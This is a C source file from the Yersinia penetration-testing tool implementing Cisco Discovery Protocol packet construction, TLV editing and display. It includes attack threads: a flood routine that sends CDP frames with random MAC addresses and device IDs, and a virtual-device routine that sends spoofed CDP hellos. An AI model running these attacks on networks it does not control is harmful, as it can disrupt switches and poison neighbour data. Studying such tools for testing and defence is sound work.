/* cdp.c
 * Implementation and attacks for Cisco Discovery Protocol
 *
 * Yersinia
 * By David Barroso <tomac@wasahero.org> and Alfredo Andres <slay@wasahero.org>
 * Copyright 2005 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: cdp.c,v 1.8 2005/09/13 12:10:39 t0mac Exp $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#ifdef HAVE_GETOPT_LONG_ONLY
#include <getopt.h>
#else
#include "getopt.h"
#endif

#include <stdarg.h>

#include "cdp.h"

/* Let's wait for libnet to fix the CDP code...
 * meanwhile we'll do it ala Dirty Harry way... 
 */

void
cdp_register(void)
{
    protocol_register(PROTO_CDP, "CDP", "Cisco Discovery Protocol", sizeof(struct cdp_data), cdp_init_attribs, NULL,
	    cdp_get_printable_packet, cdp_get_printable_store,
	    cdp_load_values, cdp_update_data, cdp_attack, cdp_help, 
	    cdp_parser, cdp_fields, NULL, cdp_update_field, cdp_features);

	protocol_register_tlv(PROTO_CDP, cdp_edit_tlv, cdp_type_desc, cdp_tlv, SIZE_ARRAY(cdp_tlv));
}


int8_t
cdp_send(struct attacks *attacks)
{
    int8_t c, i;
    int32_t total_length;
    libnet_ptag_t t;
    u_int8_t oui[3], *fixpacket;
    struct cdp_data *cdp_data;
    libnet_t *lhandler;
    u_int16_t checksum;

    cdp_data = attacks->data;
    total_length = 0;

    /* Checksum */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, chksum(cdp_data + 12, 4 + cdp_data->options_len));
    checksum = aux_short;
#else
    checksum = chksum((u_int8_t *)cdp_data + 12, 4 + cdp_data->options_len);
#endif

    fixpacket = calloc(1, 4 + cdp_data->options_len);
    memcpy((void *)fixpacket, &cdp_data->version, 1);

    memcpy((void *)fixpacket+1, &cdp_data->ttl, 1);

//    aux_short = htons(cdp_data->checksum);
    memcpy((void *)fixpacket+2, &checksum, 2);

    memcpy((void *)fixpacket+4, cdp_data->options, cdp_data->options_len);

    total_length = 4 + cdp_data->options_len;

    for ( i = 0; i < MAX_INTERFACES; i++) {
        if (attacks->used_ints[i] == 1) {
            lhandler = interfaces[i].libnet_handler;
#ifdef KK
            t = libnet_build_cdp(
                    cdp_data->version,                      /* version */
                    cdp_data->ttl,                          /* time to live */
                    htons(cdp_data->checksum),              /* checksum */
                    0,
                    0,
                    0,
                    (cdp_data->options_len == 0) ? NULL : cdp_data->options,  /* payload */
                    cdp_data->options_len,                  /* payload size */
                    lhandler,                               /* libnet handle */
                    0);                                     /* libnet id */

            if (t == -1) {
                thread_libnet_error("Can't build CDP header",lhandler);
                return -1;
            }
#endif
            oui[0] = 0x00;
            oui[1] = 0x00;
            oui[2] = 0x0C;
            t = libnet_build_802_2snap(
                0xaa,                                   /* SNAP DSAP */
                0xaa,                                   /* SNAP SSAP */
                0x03,                                   /* control */
                oui,                                    /* oui */
                0x2000,                                 /* ARP header follows */
                fixpacket,                              /* payload */
                total_length,                           /* payload size */
                lhandler,                               /* libnet handle */
                0);                                     /* libnet id */

            t = libnet_build_802_3(
                    cdp_data->mac_dest,                 /* ethernet destination */
                    (attacks->mac_spoofing) ? cdp_data->mac_source : interfaces[i].etheraddr,
                    /* ethernet source */
                    /* LIBNET_CDP_H is 0x08 and the first tuple is included so it's better say 4 (ttl 
                     * + version + checksum) */
                    LIBNET_802_2SNAP_H + total_length, /* frame size */
                    NULL,                               /* payload */
                    0,                                  /* payload size */
                    lhandler,                           /* libnet handle */
                    0);                                 /* libnet id */

            if (t == -1) {
                thread_libnet_error( "Can't build ethernet header", lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }

            /*
             *  Write it to the wire.
             */
            c = libnet_write(lhandler);

            if (c == -1) {
                thread_libnet_error( "libnet_write error", lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }

            libnet_clear_packet(lhandler);
            protocols[PROTO_CDP].packets_out++;
            interfaces[i].packets_out[PROTO_CDP]++;
                                     
        } /* if attacks->used_ints */
    
    } /* for INTERFACES*/
    
    return 0;
}

void
cdp_th_send_raw(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_send_raw pthread_sigmask()",errno);
       cdp_th_send_raw_exit(attacks);    
    }

    cdp_data = attacks->data;

    cdp_send(attacks);

    cdp_th_send_raw_exit(attacks);
}

	
void
cdp_th_send_raw_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

void
cdp_th_flood(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    u_int8_t device[8];
    sigset_t mask;
    u_int32_t aux_long, lbl32;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_flood pthread_sigmask()",errno);
       cdp_th_flood_exit(attacks);    
    }

    cdp_data = attacks->data;

    cdp_data->version = CDP_DFL_VERSION;
    parser_vrfy_mac("01:00:0C:CC:CC:CC", cdp_data->mac_dest);

    /* Max TTL */
    cdp_data->ttl = 255;

    aux_long = CDP_CAP_LEVEL3_ROUTING;

    /* Create packet */
    cdp_create_tlv_item(cdp_data, CDP_TYPE_DEVID, "yersinia");
    lbl32 = libnet_get_prand(LIBNET_PRu32);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_ADDRESS, (u_int32_t *)&lbl32);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_PORTID, "Ethernet0");
    cdp_create_tlv_item(cdp_data, CDP_TYPE_CAPABILITY, (u_int8_t *)&aux_long);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_VERSION, VERSION);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_PLATFORM, "yersinia");

    while(!attacks->attack_th.stop)
    {
        /* Change MAC */
        attack_gen_mac(cdp_data->mac_source);

        /* Change DEVICEID */
        parser_get_random_string(device, 8);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_DEVID, (void *)device) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

	    /* Change Address */
        lbl32 = libnet_get_prand(LIBNET_PRu32);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_ADDRESS, (void *)&lbl32) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

        /* Change CAPABILITIES */
        aux_long = parser_get_random_int(128);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_CAPABILITY, (void *)&aux_long) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

        /* Send the packet */
        cdp_send(attacks);
#ifdef NEED_USLEEP
        usleep(100000);
#endif
    }

    cdp_th_flood_exit(attacks);
}


void
cdp_th_flood_exit(struct attacks *attacks)
{
    if (attacks)
        attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


void
cdp_th_virtual_device(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_virtual_device pthread_sigmask()",errno);
       cdp_th_virtual_device_exit(attacks);    
    }

    cdp_data = attacks->data;

    thread_create(&attacks->helper_th.id, &cdp_send_hellos, attacks);

    while (!attacks->attack_th.stop)
       usleep(200000);

    cdp_th_virtual_device_exit(attacks);
}


void
cdp_th_virtual_device_exit(struct attacks *attacks)
{
    if (attacks)
        attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


void
cdp_send_hellos(void *arg)
{
    u_int32_t ret;
    u_int16_t secs;
    struct timeval hello;
    struct attacks *attacks;
    struct cdp_data *cdp_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());

    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    cdp_data = attacks->data;

    secs = 0;
    
write_log(0,"\n cdp_helper: %d started...\n",(int)pthread_self());
    cdp_send(attacks);
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 ) {
            thread_error("Error in select", errno);
            break;
        }

        if ( !ret )  /* Timeout... */
        {
            /* Default hello time is ttl / 3, min 5 secs */
            
            if (secs == ((cdp_data->ttl / 3) > 5 ? (cdp_data->ttl / 3) : 5)) /* Send CDP hello...*/
            {
               cdp_send(attacks);
               secs=0;
            }
            else
               secs++;
        }
        hello.tv_sec  = 1;
        hello.tv_usec = 0;
    } 

write_log(0," cdp_helper: %d finished...\n",(int)pthread_self());
    
    pthread_mutex_unlock(&attacks->helper_th.finished);
    
    pthread_exit(NULL);
}


int8_t
cdp_create_tlv_item(struct cdp_data *cdp_data, u_int16_t type, void *value)
{
    u_int16_t aux_short;
    u_int32_t aux_long;
    u_int8_t len;

    switch(type) {
        case CDP_TYPE_DEVID:
        case CDP_TYPE_PORTID:
        case CDP_TYPE_VERSION:
        case CDP_TYPE_PLATFORM:
            len = strlen(value) + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
                /* Value */
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
                cdp_data->options_len += len;
            } 
            else
                return -1;
        break;
        case CDP_TYPE_ADDRESS:
            len = 13 + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
                /* Value */
                /* Number of IP */
                aux_long = htonl(0x00000001);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);
                /* Type */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 8, "\x01", 1); /* NLPID */
                /* Length */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 9, "\x01", 1);
                /* Protocol */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 10, "\xcc", 1); /* IP */
                /* Length */
                aux_short = htons(0x0004);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 11, &aux_short, 2);
                /* IP */
//                aux_long = ntohl(addr.s_addr);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 13, (void *)value, 4);

                cdp_data->options_len += len;
            }
            else
                return -1;
        break;
        case CDP_TYPE_CAPABILITY:
            len = 4 + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
                /* Value */
                aux_long = htonl((*(u_int32_t *)value));
                memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);

                cdp_data->options_len += len;
            }
            else
                return -1;
        break;
        default:
            len = strlen(value) + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
                /* Value */
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
                cdp_data->options_len += len;
            } 
            else
                return -1;
        break;
    }

    return 0;
}


int8_t
cdp_update_tlv_item(struct cdp_data *cdp_data, u_int16_t type, char *value)
{
    u_int8_t i, value_len, j;
    u_int16_t len, aux_short, offset;
    u_int32_t aux_long;
    int8_t gap;

    i = 0;
    offset = 0;

    /* Find the TLV */
    while ((i < MAX_TLV) && (offset < cdp_data->options_len)) {
        if (ntohs((*(u_int16_t *)(cdp_data->options + offset + 2))) > cdp_data->options_len) {
            return -1; /* Oversized packet */
	}
        len = ntohs((*(u_int16_t *)(cdp_data->options + offset + 2)));
        if (ntohs((*(u_int16_t *)(cdp_data->options + offset))) == type) { /* found */

            switch(type) {
                case CDP_TYPE_DEVID:
                case CDP_TYPE_PORTID:
                case CDP_TYPE_VERSION:
                case CDP_TYPE_PLATFORM:
                    value_len = strlen(value);
                    if ((cdp_data->options_len + value_len - (len - 4)) > (MAX_TLV * MAX_VALUE_LENGTH)) {
                        write_log(0, "Trying to create oversized options\n");
                        return -1;
                    }

                    gap = value_len - (len - 4);
                    if (gap > 0) { /* Shift right */
                        for (j = cdp_data->options_len - 1; j >= offset + len; j--) 
                            cdp_data->options[j+gap] = cdp_data->options[j];
                    } else if (gap < 0) { /* Shift left */
                        for (j = offset + len; j < cdp_data->options_len; j++) 
                            cdp_data->options[j+gap] = cdp_data->options[j];
                    }

		    /* Compute real size */
		    if (gap != 0) {
		        aux_short = htons(len + gap);
		        memcpy((void *)(cdp_data->options+offset+2), &aux_short, 2);
                        cdp_data->options_len += gap;
	            }
                    memcpy((void *)(cdp_data->options+offset+4), value, value_len);
		    return 0;
                break;
                case CDP_TYPE_CAPABILITY:
                    aux_long = htonl((*(u_int32_t *)value));
                    memcpy((void *)(cdp_data->options+offset+4), &aux_long, 4);
                    return 0;
                break;
                case CDP_TYPE_ADDRESS:
                memcpy((void *)cdp_data->options + offset + 13, (void *)value, 4);
                return 0;
                break;
            }
        }
        i++;
        offset += len;
    }

    return 0;
}

int8_t
cdp_edit_tlv(struct term_node *node, u_int8_t action, u_int8_t pointer, u_int16_t type, u_int8_t *value)
{
    u_int8_t i;
    u_int16_t len, offset;
    u_int16_t aux_short;
    u_int32_t aux_long;
	struct cdp_data *cdp_data;

    i = 0;
    offset = 0;
    cdp_data = (struct cdp_data *) node->protocol[PROTO_CDP].tmp_data;

	switch(action) {
		case TLV_DELETE:
			/* Find the TLV */
			while ((i < MAX_TLV) && (offset < cdp_data->options_len)) {
				if (ntohs((*(u_int16_t *)(cdp_data->options + offset + 2))) > cdp_data->options_len) {
					return -1; /* Oversized packet */
			    }

			    len = ntohs((*(u_int16_t *)(cdp_data->options + offset + 2)));
				if (i == pointer) {
					cdp_data->options_len -= len;
					memcpy((void *)(cdp_data->options + offset), (void *)(cdp_data->options + offset + len),
							cdp_data->options_len - offset);

					/* Space left in options should be zero */
					memset((void *)(cdp_data->options + cdp_data->options_len), 0, MAX_TLV*MAX_VALUE_LENGTH - cdp_data->options_len);
					return 0;
				}

				i++;
				offset += len;
			}
		break;
		case TLV_ADD:
			switch(type) {
				case CDP_TYPE_DEVID:
				case CDP_TYPE_PORTID:
				case CDP_TYPE_VERSION:
				case CDP_TYPE_PLATFORM:
					len = strlen((char *)value) + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
						/* Value */
						memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
						cdp_data->options_len += len;
					} 
					else
						return -1;
				break;
				case CDP_TYPE_ADDRESS:
					len = 13 + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
						/* Value */
						/* Number of IP */
						aux_long = htonl(0x00000001);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);
						/* Type */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 8, "\x01", 1); /* NLPID */
						/* Length */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 9, "\x01", 1);
						/* Protocol */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 10, "\xcc", 1); /* IP */
						/* Length */
						aux_short = htons(0x0004);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 11, &aux_short, 2);
						/* IP */
		//                aux_long = ntohl(addr.s_addr);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 13, (void *)value, 4);

						cdp_data->options_len += len;
					}
					else
						return -1;
				break;
				case CDP_TYPE_CAPABILITY:
					len = 4 + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
						/* Value */
						aux_long = htonl((*(u_int32_t *)value));
						memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);

						cdp_data->options_len += len;
					}
					else
						return -1;

				break;
			}
		break;
	}

    return -1;
}


/* 
 * Return formated strings of each CDP field
 */
char **
cdp_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    char *tlv;
    u_char *cdp_data, *ptr;
    u_int8_t i, k;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
#endif
    char **field_values;
    u_int16_t type, len;

    if ((field_values = (char **) protocol_create_printable(CDP_TOTAL_FIELDS, cdp_fields)) == NULL) {
	write_log(0, "Error in calloc\n");
	return NULL;
    }

    ether = (struct libnet_802_3_hdr *) data->packet;
    cdp_data = (u_char *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    snprintf(field_values[CDP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
            ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
    /* Destination MAC */
    snprintf(field_values[CDP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
            ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
    /* Version */
    snprintf(field_values[CDP_VER], 3, "%02X", *((u_char *)cdp_data));
    /* TTL */
    snprintf(field_values[CDP_TTL], 3, "%02X", *((u_char *)cdp_data+1));
    /* Checksum */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short,cdp_data+2,2);
    snprintf(field_values[CDP_CHECKSUM], 5, "%04X", ntohs(aux_short));
#else
    snprintf(field_values[CDP_CHECKSUM], 5, "%04X", ntohs(*(u_int16_t *)(cdp_data+2)));
#endif

    ptr = cdp_data + 4;
    i = 0;
    tlv = field_values[CDP_TLV];

    /* now the tlv section starts */
    while((ptr < data->packet + data->header->caplen) && (i < MAX_TLV)) {
        if ((ptr+4) > ( data->packet + data->header->caplen)) /* Undersized packet !! */
//            return NULL;
            break;

#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        type = ntohs(aux_short);
        memcpy((void*)&aux_short,(ptr+2),2);
        len = ntohs(aux_short);
#else
        type = ntohs(*(u_int16_t *)ptr);
        len = ntohs(*(u_int16_t *)(ptr + 2));
#endif

        if ((ptr + len) > data->packet + data->header->caplen)
            return NULL; /* Oversized packet!! */

        if (!len)
            break;

        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if (len >= 4) 
        {   
            /* First we get the type */
            k = 0;
            while(cdp_type_desc[k].desc) {
                if (cdp_type_desc[k].type == type) {
                    strncpy(tlv, cdp_type_desc[k].desc, strlen((char *)cdp_type_desc[k].desc));
                    tlv += strlen((char *)cdp_type_desc[k].desc) + 1;
                    /* Now copy the value */
                    switch(type) {
                        case CDP_TYPE_DEVID:
                        case CDP_TYPE_PORTID:
                        case CDP_TYPE_VERSION:
                        case CDP_TYPE_PLATFORM:
                        case CDP_TYPE_VTP_MGMT_DOMAIN:
                        case CDP_TYPE_SYSTEM_NAME:
                        case CDP_TYPE_LOCATION:
                            if ((len-4) < MAX_VALUE_LENGTH) {
                                memcpy(tlv, ptr+4, len-4);
                                tlv += len - 4 + 1;
                            } else {
                                memcpy(tlv, ptr+4, MAX_VALUE_LENGTH);
                                tlv += MAX_VALUE_LENGTH + 1;
                //				tlv[i][MAX_VALUE_LENGTH-2] = '|';
                //				tlv[i].value[MAX_VALUE_LENGTH-1] = '\0';
                            }
                        break;
                        case CDP_TYPE_ADDRESS:
                        case CDP_TYPE_MANAGEMENT_ADDR:
                        /* Only get the 1st IP address */
                            if ((*(ptr+8) == 0x01) && (*(ptr+9) == 0x01) && (*(ptr+10) == 0xcc)) {
                                parser_get_formated_inet_address(ntohl((*(u_int32_t *)(ptr + 13))), tlv, 16);
                                tlv += 16;
                            } else {
								*tlv = '\0';
							    tlv++;
							}
                        break;
                        case CDP_TYPE_CAPABILITY: /* 4 byte field */
                            if (len == 8) {
                                snprintf(tlv, 9, "%02X%02X%02X%02X",
                                 *(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7));
            //				cdp->tlv[i].value[8] = '\0';
                                tlv += 9;
                            }
                        break;
                /*      case CDP_TYPE_IPPREFIX:
                        case CDP_TYPE_PROTOCOL_HELLO:*/
                        case CDP_TYPE_NATIVE_VLAN:
                            snprintf(tlv, 5, "%04X", ntohs(*((u_int16_t *)(ptr+4))));
                            tlv += 5;
                        break;
                        case CDP_TYPE_DUPLEX:
                        case CDP_TYPE_TRUST_BITMAP:
                        case CDP_TYPE_UNTRUSTED_COS:
                            snprintf(tlv, 3, "%02X", *((u_int8_t *)(ptr+4)));
                            tlv += 3;
                        break;
                    /*            case CDP_TYPE_VOIP_VLAN_REPLY:
                        case CDP_TYPE_VOIP_VLAN_QUERY:
                        case CDP_TYPE_MTU:
                        case CDP_TYPE_SYSTEM_OID:*/
                        default:
                            *tlv = '\0';
                            tlv++;
                        break;
                    }
                }
                k++;
            }
        }
        i++;
        ptr += len;
    }

    return (char **)field_values;
}


char **
cdp_get_printable_store(struct term_node *node)
{
    struct cdp_data *cdp;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif
    u_int8_t *ptr, i, k;
    char **field_values, *tlv;
    u_int16_t type, len, total;

    /* smac + dmac + version + ttl + checksum + tlv + null = 7 */
    if ((field_values = (char **) protocol_create_printable(CDP_TOTAL_FIELDS, cdp_fields)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

	if (node == NULL)
		cdp = protocols[PROTO_CDP].default_values;
	else
        cdp = (struct cdp_data *) node->protocol[PROTO_CDP].tmp_data;

    /* Source MAC */
    snprintf(field_values[0], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            cdp->mac_source[0], cdp->mac_source[1],
            cdp->mac_source[2], cdp->mac_source[3],
            cdp->mac_source[4], cdp->mac_source[5]);
    /* Destination MAC */
    snprintf(field_values[1], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            cdp->mac_dest[0], cdp->mac_dest[1],
            cdp->mac_dest[2], cdp->mac_dest[3],
            cdp->mac_dest[4], cdp->mac_dest[5]);

    /* Version */
    snprintf(field_values[2], 3, "%02X", cdp->version);

    /* TTL */
    snprintf(field_values[3], 3, "%02X", cdp->ttl);

    /* Checksum */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, cdp->checksum, 2);
    snprintf(field_values[4], 5, "%04X", aux_short);
#else
    snprintf(field_values[4], 5, "%04X", cdp->checksum);
#endif

    ptr = cdp->options;
	tlv = field_values[CDP_TLV];
    i = 0;
	total = 0;
    /* TLV */
    /* Take care: options in the store are stored in network byte order */
    while((i < MAX_TLV) && (ptr < cdp->options + cdp->options_len) && (total < MAX_TLV*MAX_VALUE_LENGTH)) {
#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        type = ntohs(aux_short);
        memcpy((void*)&aux_short,(ptr+2),2);
        len = ntohs(aux_short);
#else
        type = ntohs(*(u_int16_t *)ptr);
        len = ntohs(*(u_int16_t *)(ptr + 2));
#endif

        if (!len) {
			write_log(0, "TLV with no len\n");
            return NULL;
		}

        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if (len >= 4) 
        {   
            /* First we get the type */
            k = 0;
            while(cdp_type_desc[k].desc) {
                if (cdp_type_desc[k].type == type) {
                    strncpy(tlv, cdp_type_desc[k].desc, strlen((char *)cdp_type_desc[k].desc));
                    tlv += strlen((char *)cdp_type_desc[k].desc) + 1;
                    total += strlen((char *)cdp_type_desc[k].desc) + 1;
                    /* Now copy the value */
                    switch(type) {
                        case CDP_TYPE_DEVID:
                        case CDP_TYPE_PORTID:
                        case CDP_TYPE_VERSION:
                        case CDP_TYPE_PLATFORM:
                        case CDP_TYPE_VTP_MGMT_DOMAIN:
                        case CDP_TYPE_SYSTEM_NAME:
                        case CDP_TYPE_LOCATION:
                            if ((len-4) < MAX_VALUE_LENGTH) {
                                memcpy(tlv, ptr+4, len-4);
                                tlv += len - 4 + 1;
                                total += len - 4 + 1;
                            } else {
                                memcpy(tlv, ptr+4, MAX_VALUE_LENGTH);
                                tlv += MAX_VALUE_LENGTH + 1;
                                total += MAX_VALUE_LENGTH + 1;
                            }
                        break;
                        case CDP_TYPE_ADDRESS:
                        case CDP_TYPE_MANAGEMENT_ADDR:
                        /* Only get the 1st IP address */
                            if ((*(ptr+8) == 0x01) && (*(ptr+9) == 0x01) && (*(ptr+10) == 0xcc)) {
                                parser_get_formated_inet_address(ntohl((*(u_int32_t *)(ptr + 13))), tlv, 16);
                                tlv += 16;
                                total += 16;
                            } else {
								*tlv = '\0';
							    tlv++;
							}
                        break;
                        case CDP_TYPE_CAPABILITY: /* 4 byte field */
                            if (len == 8) {
                                snprintf(tlv, 9, "%02X%02X%02X%02X", *(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7));
                                tlv += 9;
                                total += 9;
                            }
                        break;
                /*      case CDP_TYPE_IPPREFIX:
                        case CDP_TYPE_PROTOCOL_HELLO:*/
                        case CDP_TYPE_NATIVE_VLAN:
                            snprintf(tlv, 5, "%04X", ntohs(*((u_int16_t *)(ptr+4))));
                            tlv += 5;
                            total += 5;
                        break;
                        case CDP_TYPE_DUPLEX:
                        case CDP_TYPE_TRUST_BITMAP:
                        case CDP_TYPE_UNTRUSTED_COS:
                            snprintf(tlv, 3, "%02X", *((u_int8_t *)(ptr+4)));
                            tlv += 3;
                            total += 3;
                        break;
                    /*  case CDP_TYPE_VOIP_VLAN_REPLY:
                        case CDP_TYPE_VOIP_VLAN_QUERY:
                        case CDP_TYPE_MTU:
                        case CDP_TYPE_SYSTEM_OID:*/
                        default:
                            *tlv = '\0';
                            tlv++;
                            total++;
                        break;
                    }
                }
                k++;
            }
        }

        i++;
        ptr += len;
    }

    return (char **)field_values;
}


char *
cdp_get_type_info(u_int16_t type)
{
    u_int8_t i;

    i = 0;
    while (cdp_type_desc[i].desc) {
        if (cdp_type_desc[i].type == type)
            return cdp_type_desc[i].desc;
        i++;
    }

    return "(Unknown)";
}


/* Take care: options in the store are stored in network byte order */
int8_t
cdp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct cdp_data *cdp;
    u_char *cdp_data, *ptr;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif
    u_int8_t i;
    u_int16_t type, len, total;

    cdp = (struct cdp_data *)values;
    ether = (struct libnet_802_3_hdr *) data->packet;
